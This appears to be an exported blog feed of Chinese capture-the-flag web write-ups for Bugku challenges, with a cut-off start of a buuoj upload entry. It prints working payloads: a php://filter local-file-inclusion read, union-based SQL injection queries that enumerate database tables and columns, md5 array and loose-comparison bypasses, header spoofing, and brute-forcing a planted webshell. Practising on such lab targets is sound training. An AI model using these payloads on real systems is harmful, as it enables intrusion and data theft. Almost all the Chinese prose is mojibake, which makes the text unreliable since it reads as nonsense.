<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
var_dump(<span class="hljs-string">"admin"</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"1admin"</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"admin1"</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span>
var_dump(<span class="hljs-string">"admin1"</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"0e123456"</span>==<span class="hljs-string">"0e4456789"</span>); <span class="hljs-comment">//true</span>
<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//ä¸Šè¿°ä»£ç å¯è‡ªè¡Œæµ‹è¯•</span></code></pre></div>

<div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>è§‚å¯Ÿä¸Šè¿°ä»£ç ï¼Œ<span class="hljs-string">"admin"</span>==<span class="hljs-number">0</span> æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†adminè½¬åŒ–æˆæ•°å€¼ï¼Œå¼ºåˆ¶è½¬åŒ–,ç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬åŒ–çš„ç»“æœæ˜¯<span class="hljs-number">0</span>è‡ªç„¶å’Œ<span class="hljs-number">0</span>ç›¸ç­‰
<span class="hljs-symbol">2 </span><span class="hljs-string">"1admin"</span>==<span class="hljs-number">1</span> æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†<span class="hljs-number">1</span>adminè½¬åŒ–æˆæ•°å€¼,ç»“æœä¸º<span class="hljs-number">1</span>ï¼Œè€Œâ€œadmin1â€œ==<span class="hljs-number">1</span> å´ç­‰äºé”™è¯¯ï¼Œä¹Ÿå°±æ˜¯<span class="hljs-string">"admin1"</span>è¢«è½¬åŒ–æˆäº†<span class="hljs-number">0</span>,ä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿ
<span class="hljs-symbol">3 </span><span class="hljs-string">"0e123456"</span>==<span class="hljs-string">"0e456789"</span>ç›¸äº’æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†<span class="hljs-number">0e</span>è¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œ<span class="hljs-number">0</span>çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶ï¼Œæ‰€ä»¥ç›¸ç­‰</code></pre></div>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>æŸ¥çœ‹æºç åï¼Œåœ¨æœ€ä¸‹é¢çœ‹åˆ°ä¸€ä¸²ç¼–ç ï¼Œä¸ºunicodeç¼–ç </p>
<div class="hljs"><pre><code class="hljs c">&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">69</span>;&amp;#<span class="hljs-number">89</span>;&amp;#<span class="hljs-number">123</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">52</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">104</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">45</span>;&amp;#<span class="hljs-number">72</span>;&amp;#<span class="hljs-number">83</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">125</span>;</code></pre></div>

<p>ä½¿ç”¨å·¥å…·è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p>
<p><img src="/2020/09/06/bugku1-10/5.png" srcset="/img/loading.gif" alt></p>
<h2 id="åŸŸåè§£æ"><a href="#åŸŸåè§£æ" class="headerlink" title="åŸŸåè§£æ"></a>åŸŸåè§£æ</h2><p><strong>dnsæœåŠ¡å™¨ç”¨æ¥è§£æåŸŸåä¸ºIPï¼Œå¾ˆå¤šå›½å¤–çš„æœåŠ¡å™¨ä¸èƒ½è®¿é—®ï¼Œä¸»è¦åŸå› å°±æ˜¯DNSæœåŠ¡å™¨ä¸èƒ½è§£æé‚£äº›åŸŸå</strong></p>
<p><strong>hostså°±æ˜¯æœ¬åœ°ç”¨æ¥è§£æåŸŸåä¸ºIP</strong>  </p>
<p>å› æ­¤hostsæ–‡ä»¶ä¸­æœ‰çš„åŸŸåè®°å½•ï¼Œåœ¨æœ¬ç”µè„‘æµè§ˆå™¨ä¸­å¯ç›´æ¥ä½¿ç”¨åŸŸåè®¿é—®</p>
<p>ï¼ˆhostsæ–‡ä»¶éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œä¿®æ”¹æ–¹å¼ä¸ºä½¿ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œè®°äº‹æœ¬åæ‰“å¼€hostsï¼‰</p>
<p>è·¯å¾„ä¸ºï¼š</p>
<div class="hljs"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc</code></pre></div>



<p><img src="/2020/09/06/bugku1-10/host.png" srcset="/img/loading.gif" alt></p>
<p>æ–‡ä»¶ä¿å­˜ååœ¨æµè§ˆå™¨ä¸­è®¿é—®è¯¥åŸŸå è·å¾—flag</p>
<h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹"><a href="#ä½ å¿…é¡»è®©ä»–åœä¸‹" class="headerlink" title="ä½ å¿…é¡»è®©ä»–åœä¸‹"></a>ä½ å¿…é¡»è®©ä»–åœä¸‹</h2><p>æ‰“å¼€é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå‘ç°ï¼ŒæŠ“åŒ…è¯•è¯•</p>
<p>goå®Œä¹Ÿæ²¡ä»€ä¹ˆååº”ï¼Œæœ‰ç‚¹è¿·æƒ‘</p>
<p>ä½†æ˜¯å¤šgoå‡ æ¬¡åï¼Œå‘ç°æœ‰å¼ å›¾ç‰‡åœ¨å˜</p>
<p><img src="/2020/09/06/bugku1-10/stop.png" srcset="/img/loading.gif" alt></p>
<p>å¤šgoå‡ æ¬¡å°±å‡ºæ¥äº†flag,åŸç†è¿˜æœªçŸ¥</p>
<p><img src="/2020/09/06/bugku1-10/stop1.png" srcset="/img/loading.gif" alt></p>
<h2 id="å˜é‡1"><a href="#å˜é‡1" class="headerlink" title="å˜é‡1"></a>å˜é‡1</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag1.php"</span>;
highlight_file(<span class="hljs-keyword">__file__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'args'</span>]))&#123;
  $args = $_GET[<span class="hljs-string">'args'</span>];
  <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/^\w+$/"</span>,$args))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"args error!"</span>);
  &#125;
  <span class="hljs-keyword">eval</span>(<span class="hljs-string">"var_dump($$args);"</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p> é¦–å…ˆçœ‹åˆ°è¦ç”¨getæ–¹å¼æäº¤ä¸€ä¸ªargså‚æ•°ï¼Œè€Œåœ¨æœ€åä¸€è¡Œä»£ç é‡Œåˆæœ‰var_dump(&amp;&amp;args)ï¼Œäºæ˜¯ä¼ å…¥argså‚æ•°çš„å€¼ä¸ºGLOBALS,è¿™æ ·æœ€åä¸€è¡Œä»£ç å°±å˜æˆäº†var_dumpï¼ˆ&amp;GLOBALSï¼‰ï¼Œç„¶åvar_dumpå‡½æ•°è¿è¡Œä¼šè¾“å‡ºæ‰€æœ‰å˜é‡ï¼Œå¾—å‡ºflagã€‚ </p>
<p> <strong>Globalçš„ä½œç”¨æ˜¯å®šä¹‰å…¨å±€å˜é‡,ä½†æ˜¯è¿™ä¸ªå…¨å±€å˜é‡ä¸æ˜¯åº”ç”¨äºæ•´ä¸ªç½‘ç«™,è€Œæ˜¯åº”ç”¨äºå½“å‰é¡µé¢,åŒ…æ‹¬includeæˆ–requireçš„æ‰€æœ‰æ–‡ä»¶ã€‚</strong> </p>
<p> <strong>GLOBALS:ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„</strong> </p>
<p>å³å°†includeâ€flag.phpâ€ä½œä¸ºå…¨å±€å˜é‡åœ¨æœ¬é¡µé¢è¾“å‡º</p>
<p>?args=GLOBALS</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>æºç ä¸­ä¸€ä¸²ç‰¹åˆ«çš„ä»£ç ç›´æ¥æ”¾åœ¨æµè§ˆå™¨çš„æ§åˆ¶å°ä¸­è¿è¡Œ</p>
<p><img src="/2020/09/06/bugku1-10/web5.png" srcset="/img/loading.gif" alt></p>
<h2 id="å¤´ç­‰èˆ±"><a href="#å¤´ç­‰èˆ±" class="headerlink" title="å¤´ç­‰èˆ±"></a>å¤´ç­‰èˆ±</h2><p>æ‰“å¼€é¡µé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p>
<p>æ‰«æç›®å½•ï¼Œæ‰«å‡ºæ¥ä¸€å¤§å †æ²¡ç”¨çš„ï¼Œç›´æ¥æŠ“åŒ…</p>
<p>ã€‚ã€‚ã€‚ã€‚å°±å‡ºæ¥äº†</p>
<p><img src="/2020/09/06/bugku1-10/toudengcang.png" srcset="/img/loading.gif" alt></p>
<h2 id="ç½‘ç«™è¢«é»‘"><a href="#ç½‘ç«™è¢«é»‘" class="headerlink" title="ç½‘ç«™è¢«é»‘"></a>ç½‘ç«™è¢«é»‘</h2><p>åå­—æç¤ºäº†ï¼Œç½‘ç«™è¢«é»‘ã€‚</p>
<p>æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°é¼ æ ‡åŠ¨ä¸äº†ï¼Œå¯èƒ½æ˜¯è¢«é»‘åçš„åé—ç—‡</p>
<p>å…ˆæ‰«æç›®å½•å‘ç°äº†<code>shell.php</code>,è¿™å¯èƒ½æ˜¯ä¸Šæ¬¡é»‘å®¢ç•™ä¸‹çš„å°é©¬æ–‡ä»¶</p>
<p><img src="/2020/09/06/bugku1-10/hack2.png" srcset="/img/loading.gif" alt></p>
<p>æ‰“å¼€é¡µé¢ï¼Œéœ€è¦å¯†ç ï¼Œè¿™å°±éœ€è¦çˆ†ç ´äº†(æŸ¥çœ‹äº†wp,çŸ¥é“äº†å¯†ç ä¸ºhack,ä¸çŸ¥é“æ—¶å°±éœ€è¦ä¸€ä¸ªè¶³å¤Ÿå¤§çš„å¯†ç å­—å…¸æ‰èƒ½ç ´è§£)</p>
<p>ç¡®å®šè¦çˆ†ç ´çš„å˜é‡</p>
<p><img src="/2020/09/06/bugku1-10/hack3.png" srcset="/img/loading.gif" alt></p>
<p>åŠ è½½å¯†ç å­—å…¸</p>
<p><img src="/2020/09/06/bugku1-10/hack4.png" srcset="/img/loading.gif" alt></p>
<p>å‡ºç°ç»“æœï¼ˆæ ¹æ®lengthç¡®å®šå¯†ç ï¼‰</p>
<p><img src="/2020/09/06/bugku1-10/hack.png" srcset="/img/loading.gif" alt></p>
<p>å¯†ç ä¸º<code>hack</code></p>
<p>ç™»å½•å³å¯</p>
<h2 id="ç®¡ç†å‘˜ç³»ç»Ÿ"><a href="#ç®¡ç†å‘˜ç³»ç»Ÿ" class="headerlink" title="ç®¡ç†å‘˜ç³»ç»Ÿ"></a>ç®¡ç†å‘˜ç³»ç»Ÿ</h2><p>éšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å‘ç°æç¤ºIP</p>
<p><img src="/2020/09/06/bugku1-10/admin1.png" srcset="/img/loading.gif" alt></p>
<p>æƒ³åˆ°äº†<code>X-FORWORADED-FOR:127.0.0.1</code></p>
<p>æŠ“åŒ…è¯•è¯•</p>
<p>åœ¨å“åº”åŒ…ä¸­å‘ç°ä¸€æ®µbase64ç¼–ç <code>dGVzdDEyMw==</code> è§£å¯†åä¸ºtest123ï¼ŒçŒœæµ‹ä¸ºç™»å½•å¯†ç </p>
<p>ç»“æœçœŸå¯¹äº†</p>
<p><img src="/2020/09/06/bugku1-10/admin2.png" srcset="/img/loading.gif" alt></p>
<p>å½“ç„¶è¿™é¢˜ä¹Ÿå¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ–¹æ³•åšï¼Œä½†æ˜¯å¯†ç å­—å…¸éœ€è¦åŒ…å«test123</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>æŸ¥çœ‹æºç å‘ç°ä¸€æ®µjsä»£ç </p>
<p>å°†æœ€åçš„evalæ”¹æˆalert(),ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œå¼¹å‡ºç»“æœ</p>
<div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSubmit</span>(<span class="hljs-params"></span>)</span>&#123;
<span class="hljs-keyword">var</span> a=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"password"</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-string">"undefined"</span>!=<span class="hljs-keyword">typeof</span> a)&#123;
<span class="hljs-keyword">if</span>(<span class="hljs-string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)
<span class="hljs-keyword">return</span>!<span class="hljs-number">0</span>;
alert(<span class="hljs-string">"Error"</span>);
a.focus();
<span class="hljs-keyword">return</span>!<span class="hljs-number">1</span>&#125;
&#125;
<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"levelQuest"</span>).onsubmit=checkSubmit;</code></pre></div>

<p><img src="/2020/09/06/bugku1-10/web4.png" srcset="/img/loading.gif" alt></p>
<p><code>if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</code></p>
<p>ç›´æ¥è¾“å…¥67d709b2b54aa2aa648cf6e87a7114f1</p>
<p><img src="/2020/09/06/bugku1-10/web41.png" srcset="/img/loading.gif" alt></p>
<h2 id="flagåœ¨indexé‡Œ"><a href="#flagåœ¨indexé‡Œ" class="headerlink" title="flagåœ¨indexé‡Œ"></a>flagåœ¨indexé‡Œ</h2><p>é¢˜ç›®å·²ç»æç¤ºäº†flagçš„ä½ç½®åº”è¯¥åœ¨index.phpä¸­ï¼Œé‚£ä¹ˆè·å–index.phpçš„æºç å°±å¾ˆå…³é”®ï¼Œå¯æ˜¯æŸ¥çœ‹æºç ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p>
<p>æ³¨æ„åˆ°äº†url:<a href="http://123.206.87.240:8005/post/index.php?file=show.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=show.php</a></p>
<p>å‡ºç°fileè¿™ä¸ªå‚æ•°ï¼Œæƒ³åˆ°äº†æ–‡ä»¶åŒ…å«çš„æ¼æ´</p>
<p>ç”¨ä¸‹é¢çš„payload,è·å–index.phpï¼Œæºç çš„base64å€¼</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<div class="hljs"><pre><code class="hljs llvm">PGh<span class="hljs-number">0</span>bWw+DQogICAgPHRpdGxlPkJ<span class="hljs-number">1</span>Z<span class="hljs-number">2</span>t<span class="hljs-number">1</span>LWN<span class="hljs-number">0</span>ZjwvdGl<span class="hljs-number">0</span>bGU+DQogICAgDQo<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocA<span class="hljs-number">0</span>KCWVycm<span class="hljs-number">9</span>yX<span class="hljs-number">3</span>JlcG<span class="hljs-number">9</span>ydGluZygwKTsNCglpZighJF<span class="hljs-number">9</span>HRVRbZmlsZV<span class="hljs-number">0</span>pe<span class="hljs-number">2</span>VjaG<span class="hljs-number">8</span>gJzxhIGhyZWY<span class="hljs-number">9</span>I<span class="hljs-keyword">i4</span>vaW<span class="hljs-number">5</span>kZXgucGhwP<span class="hljs-number">2</span>ZpbGU<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>hvdy<span class="hljs-number">5</span>waHAiPmNsaWNrIG<span class="hljs-number">1</span>lPyBubzwvYT<span class="hljs-number">4</span>nO<span class="hljs-number">30</span>NCgkkZmlsZT<span class="hljs-number">0</span>kX<span class="hljs-number">0</span>dFVFsnZmlsZSddOw<span class="hljs-number">0</span>KCWlmKHN<span class="hljs-number">0</span>cnN<span class="hljs-number">0</span>cigkZmlsZSwiL<span class="hljs-keyword">i4</span>vIil<span class="hljs-number">8</span>fHN<span class="hljs-number">0</span>cmlzdHIoJGZpbGUsICJ<span class="hljs-number">0</span>cCIpfHxzdHJpc<span class="hljs-number">3</span>RyKCRmaWxlLCJpbnB<span class="hljs-number">1</span>dCIpfHxzdHJpc<span class="hljs-number">3</span>RyKCRmaWxlLCJkYXRhIikpew<span class="hljs-number">0</span>KCQllY<span class="hljs-number">2</span>hvICJPaCBubyEiOw<span class="hljs-number">0</span>KCQlleGl<span class="hljs-number">0</span>KCk<span class="hljs-number">7</span>DQoJfQ<span class="hljs-number">0</span>KCWluY<span class="hljs-number">2</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span>ZGUoJGZpbGUpOyANC<span class="hljs-keyword">i8</span>vZmxhZzpmbGFne<span class="hljs-number">2</span>VkdWxjbmlfZWxpZl<span class="hljs-number">9</span>sYWNvbF<span class="hljs-number">9</span>zaV<span class="hljs-number">9</span>zaWh<span class="hljs-number">0</span>fQ<span class="hljs-number">0</span>KPz<span class="hljs-number">4</span>NCjwvaHRtbD<span class="hljs-number">4</span>NCg==</code></pre></div>

<p>è§£ç ä¸º</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;html&gt;
    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;
  
&lt;?php
	error_reporting(0);
	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
	$file&#x3D;$_GET[&#39;file&#39;];
	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
		echo &quot;Oh no!&quot;;
		exit();
	&#125;
	include($file); 
&#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;
?&gt;
&lt;&#x2F;html&gt;</code></pre></div>

<p>è·å–flag{edulcni_elif_lacol_si_siht}</p>
<h2 id="è¯·è¾“å…¥å¯†ç "><a href="#è¯·è¾“å…¥å¯†ç " class="headerlink" title="è¯·è¾“å…¥å¯†ç "></a>è¯·è¾“å…¥å¯†ç </h2><p>æç¤ºäº†5ä½æ•°çš„å¯†ç ï¼Œç›´æ¥çˆ†ç ´</p>
<p><img src="/2020/09/06/bugku1-10/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81.png" srcset="/img/loading.gif" alt></p>
<h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p>æ‰“å¼€é¢˜ç›®åï¼Œå‡ºç°ä¸€æ®µä»£ç ï¼Œåº”è¯¥æ˜¯md5å€¼ï¼Œå¯æ˜¯è§£ç ä¸ºç©ºå¯†ç </p>
<p>æ‰«æç›®å½•<code>python dirsearch.py  -u http://123.206.87.240:8002/web16/ -e php</code></p>
<p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD1.png" srcset="/img/loading.gif" alt></p>
<p>å‘ç°äº†<code>index.php.bak</code></p>
<blockquote>
<p>è¿™ä¸ªåº”è¯¥æ˜¯åœ¨ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„å¤‡ä»½æ–‡ä»¶ï¼›<br>EDITPLUS è¿™ç±»çš„æ–‡æœ¬ç¼–è¾‘å™¨åœ¨ç¼–è¾‘æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè¿™æ ·çš„å¤‡ä»½ï¼›<br>å¦‚æœç¼–è¾‘åæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼›<br>å¯ä»¥åˆ é™¤.BAKæ–‡ä»¶             (æ¥è‡ªç™¾åº¦)</p>
</blockquote>
<p>ä¸‹è½½.bakæ–‡ä»¶æ‰“å¼€åï¼Œå‘ç°æºç ï¼Œå¼€å§‹å®¡è®¡</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment"></span>
<span class="hljs-comment"> * Created by PhpStorm.</span>
<span class="hljs-comment"> * User: Norse</span>
<span class="hljs-comment"> * Date: 2017/8/6</span>
<span class="hljs-comment"> * Time: 20:22</span>
<span class="hljs-comment">   */</span>

<span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;
ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);
$str = substr($str,<span class="hljs-number">1</span>);
$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);<span class="hljs-comment">//å¯¹keyè¿›è¡Œäº†è¿‡æ»¤</span>
parse_str($str);
<span class="hljs-keyword">echo</span> md5($key1);

<span class="hljs-keyword">echo</span> md5($key2);
<span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;<span class="hljs-comment">//è¿™é‡Œéœ€è¦ä½¿ç”¨md()å‡½æ•°å¯¹æ•°ç»„å¤„ç†æ—¶çš„æ¼æ´</span>
    <span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"å–å¾—flag"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>url:<code>http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss</code></p>
<p> å¯¹ä¸Šä¼ çš„å€¼è¿›è¡Œäº†è¿‡æ»¤key, kekeyyå¯ä»¥ç»•è¿‡</p>
<p> 1.md5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå°†ä¸¤ä¸ªå‚æ•°è®¾ç½®ä¸ºæ•°ç»„ç±»å‹ç»è¿‡md5å‡½æ•°åŠ å¯†åéƒ½ä¸ºNULLæ•…äºŒè€…ç›¸ç­‰<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.åˆ©ç”¨==æ¯”è¾ƒæ¼æ´</p>
<p> å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚</p>
<p> ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p>
<div class="hljs"><pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a</code></pre></div><p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD.png" srcset="/img/loading.gif" alt></p>
<h2 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h2><div class="hljs"><pre><code class="hljs html">1' and 1=1 #      
  
1' and 1=2 #</code></pre></div>
<p>   ä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯ä»¥åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹</p>
<h2 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h2><h3 id="1-1-39-order-by-4-å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ"><a href="#1-1-39-order-by-4-å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ" class="headerlink" title="1.1&#39; order by 4 #å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ"></a>1.<code>1&#39; order by 4 #</code>å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ</h3><h3 id="2-çˆ†æ•°æ®åº“"><a href="#2-çˆ†æ•°æ®åº“" class="headerlink" title="2.çˆ†æ•°æ®åº“"></a>2.çˆ†æ•°æ®åº“</h3><div class="hljs"><pre><code>` -1&apos; union select 1,database(),3,4 #`

  database:skctf_flag</code></pre></div><h3 id="3-çˆ†å‡ºè¡¨å"><a href="#3-çˆ†å‡ºè¡¨å" class="headerlink" title="3.çˆ†å‡ºè¡¨å"></a>3.çˆ†å‡ºè¡¨å</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre></div><p> table:fl4g,sc</p>
<h3 id="4-å­—æ®µå"><a href="#4-å­—æ®µå" class="headerlink" title="4.å­—æ®µå"></a>4.å­—æ®µå</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre></div><p> skctf_flag</p>
<p> å¾—åˆ°flag</p>
<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
<h2 id="ç§‹åå±±è½¦ç¥"><a href="#ç§‹åå±±è½¦ç¥" class="headerlink" title="ç§‹åå±±è½¦ç¥"></a>ç§‹åå±±è½¦ç¥</h2><p>çœ‹åˆ°é¢˜ç›®å°±çŸ¥é“éœ€è¦ç”¨pythonçš„è„šæœ¬æ¥åšï¼ˆèœé¸¡ä¸é…ï¼‰ï¼Œç½‘ä¸Šæ‰¾çš„è„šæœ¬</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
url=<span class="hljs-string">'http://120.24.86.145:8002/qiumingshan/'</span>
r=requests.session()
requestpage = r.get(url)
ans=re.findall(<span class="hljs-string">'&lt;div&gt;(.*?)=?;&lt;/div&gt;'</span>,requestpage.text)<span class="hljs-comment">#è·å–è¡¨è¾¾å¼ï¼Œæˆ‘æ­£åˆ™å†™çš„å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œå¤šåŒ¹é…äº†æœ€åçš„=?ä¸¤ä¸ªå­—ç¬¦</span>
ans=<span class="hljs-string">""</span>.join(ans)<span class="hljs-comment">#åˆ—è¡¨è½¬ä¸ºå­—ç¬¦ä¸²</span>
ans=ans[:<span class="hljs-number">-2</span>]<span class="hljs-comment">#å»æ‰æœ€åçš„=?</span>
post=eval(ans)<span class="hljs-comment">#è®¡ç®—è¡¨è¾¾å¼çš„å€¼</span>
data=&#123;<span class="hljs-string">'value'</span>:post&#125;<span class="hljs-comment">#æ„é€ postçš„dataéƒ¨åˆ†</span>
flag=r.post(url,data=data)
print(flag.text)</code></pre></div>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>sql</tag>
        <tag>å¼±ç±»å‹</tag>
        <tag>åŸŸåè§£æ</tag>
        <tag>çˆ†ç ´</tag>
        <tag>è„šæœ¬</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj-LFI</title>
    <url>/2020/10/08/buuoj-LFI/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj-upload</title>
    <url>/2020/10/08/buuoj-upload/</url>
    <content><![CDATA[<h1 id="buuoj-upload"><a href="#buuoj-upload" class="headerlink" title="buuoj-upload"></a>buuoj-upload</h1><a id="more"></a>



<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸäº†ï¼Œè¿˜ç»™å‡ºäº†æ–‡ä»¶çš„ä¿å­˜è·¯å¾„</p>
<p>å†å°è¯•ä¸Šä¼ <code>1.php</code>ä½†æ˜¯å‡ºç°äº†ï¼ŒæŠ¥é”™æç¤º</p>
